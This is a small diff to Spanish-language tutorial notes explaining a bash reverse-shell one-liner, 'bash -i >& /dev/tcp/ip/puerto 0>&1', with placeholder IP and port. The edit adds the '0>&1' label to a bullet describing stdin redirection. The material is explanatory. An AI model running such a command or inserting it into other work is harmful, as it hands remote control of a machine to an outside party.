@@ -526,7 +526,7 @@ bash -i >& /dev/tcp/ip/puerto 0>&1
 Entonces:
 - bash -i: : Inicia una instancia interactiva de bash.
 - \>& /dev/tcp/ip/puerto : envia la salida de error y estandard por la conexion TCP
-- redirige la entrada estandard hacia el mismo destino que la salida estandard.
+- 0>&1 : redirige la entrada estandard hacia el mismo destino que la salida estandard.
 
 En resumen estamos enviando todas las entradas y salidas por el dispositivo /dev/tcp/ip
 
